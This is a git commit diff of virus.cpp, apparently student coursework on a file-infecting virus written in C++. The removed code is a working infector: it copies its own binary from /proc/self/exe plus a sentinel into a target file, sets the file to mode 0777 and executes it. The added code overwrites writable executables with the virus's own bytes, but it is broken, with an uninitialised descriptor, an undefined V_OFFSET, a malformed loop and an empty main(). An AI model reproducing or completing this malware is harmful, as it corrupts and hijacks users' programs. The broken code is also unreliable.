b6ac862bf4914c12e84b89b593e7f1dfbc8c5b17
sjraber <sjraber@Mtu.edu>
2024-11-18 19:34:41 -0500

    Add files via upload

--- virus.cpp
+++ virus.cpp
@@ -1,67 +1,66 @@
 #include <iostream>
 #include <fstream>
-#include <vector>
+#include <string>
 #include <cstring>
 #include <cstdlib>
 #include <sys/stat.h>
 #include <unistd.h>
+#include <cstdio>
 
-#define sentinel 0xdeadbeef
+using namespace std;
 
-//function to read file
-std::vector<char> fileRead(const std::string &filename){
-    std::ifstream file(filename, std::ios::binary | std::ios::ate);
-    if (!file.is_open()){
-        exit(1);
+void infect(int argc, char *argv[], int fd_r){
+    int fd_t;
+    int target, i;
+    int done, bytes, length;
+    void *map;
+    struct stat stat;
+    char buf[BUFSIZ];
+
+
+    if (argc < 2){
+        return;
     }
-    size_t fSize = file.tellg();
-    file.seekg(0, std::ios::beg);
-
-    std::vector<char> buffer(fSize);
-    file.read(buffer.data(), fSize);
-    return buffer;
-}
-
-//function to write to file
-
-void writeToFile(const std::string &filename, const std::vector<char> &data){
-    std::ofstream file(filename, std::ios::binary | std::ios::app);
-    file.write(data.data(), data.size());
-    file.close();
-}
-
-//function to find virus code
-//using u_int32_t to guarantee 32 bits
-std::vector<char> findVirus(const std::vector<char> &virus, u_int32_t pos){
-    size_t i = 0;
-    while(i < virus.size() - sizeof(pos)){
-        u_int32_t j;
-        std::memcpy(&j, &virus[i], sizeof(j));
-        if(j == pos){
-            i = i+sizeof(pos);
-            break;
+    for(target = 1; target<argc; target++){
+        if(!access(argv[target], W_OK | X_OK)){
+            goto NAILED;
         }
-        i = i+1;
     }
-    return std::vector<char>(virus.begin()+i, virus.end());
+    return;
+    NAILED:
+    fstat(fd_t, &stat);
+    length = stat.st_size;
+
+    map = (char *)malloc(length);
+    if (!map){
+        goto OUT;
+    }
+    for( i = 0, i < length; i++){
+        read(fd_t, map + i, 1);
+    }
+    lseek(fd_t, 0 , SEEK_SET);
+    if (ftruncate(fd_t, 0)){
+        goto OUT;
+    }
+    done = 0;
+    lseek(fd_r, 0, SEEK_SET);
+    while(done < V_OFFSET){
+        bytes = read(fd_r, buf, 1);
+        write(fd_t, buf, bytes);
+        done+=bytes;
+    }
+    OUT:
+        close(fd_t);
+        return;
 }
+int main (int argc, char *argv[]){
+    
+    
 
 
-int main(int argc, char *argv[]){
 
-    std::string f = argv[1];
-    //rp = running program
-    std::vector<char> rp = fileRead("/proc/self/exe");
-    u_int32_t s = sentinel;
-    std::cout << "running program size = " << rp.size();
 
-    writeToFile(f, std::vector<char>(reinterpret_cast<char*>(&s), reinterpret_cast<char*>(&s)+sizeof(s)));
-    writeToFile(f, rp);
 
-    chmod(f.c_str(), 0777);
 
-    execl(f.c_str(), f.c_str());
     return 0;
-
-
 }
